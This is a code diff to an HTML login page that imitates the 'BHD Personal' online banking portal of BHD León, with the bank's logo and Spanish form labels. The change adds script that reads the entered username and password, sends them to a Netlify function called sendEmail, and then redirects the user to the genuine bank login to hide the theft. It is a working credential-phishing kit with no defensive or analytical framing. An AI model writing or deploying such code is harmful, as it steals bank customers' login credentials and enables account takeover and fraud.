@@ -97,7 +97,7 @@
     <div class="login-container">
         <img src="assets/logo-bhd.svg" alt="BHD León Logo">
         <h2>BHD Personal</h2>
-        <form action="#" onsubmit="return false;">
+        <form id="login-form">
             <div class="form-group">
                 <label for="usuario">Usuario *</label>
                 <input type="text" id="usuario" name="usuario" required>
@@ -106,7 +106,7 @@
                 <label for="contrasena">Contraseña *</label>
                 <input type="password" id="contrasena" name="contrasena" required>
             </div>
-            <button type="submit" onclick="redireccionar()">Entrar</button>
+            <button type="submit">Entrar</button>
             <div class="forgot-password">
                 <p><a href="#">¿Olvidaste tu clave de acceso?</a></p>
             </div>
@@ -114,9 +114,36 @@
     </div>
 
     <script>
-        function redireccionar() {
-            window.location.href = "https://ibp.bhd.com.do/#/login";  // Redirige al enlace de BHD
-        }
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe automáticamente
+
+            var usuario = document.getElementById("usuario").value;
+            var contrasena = document.getElementById("contrasena").value;
+
+            // Enviar los datos al backend usando Fetch API
+            fetch("/.netlify/functions/sendEmail", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    username: usuario,
+                    password: contrasena
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Si el correo se envió correctamente, redirige
+                if (data.message === "Correo enviado con éxito") {
+                    window.location.href = "https://ibp.bhd.com.do/#/login";  // Redirige al enlace de BHD
+                } else {
+                    alert("Hubo un problema al enviar el correo.");
+                }
+            })
+            .catch(error => {
+                alert("Error al enviar el correo: " + error);
+            });
+        });
     </script>
 
 </body>
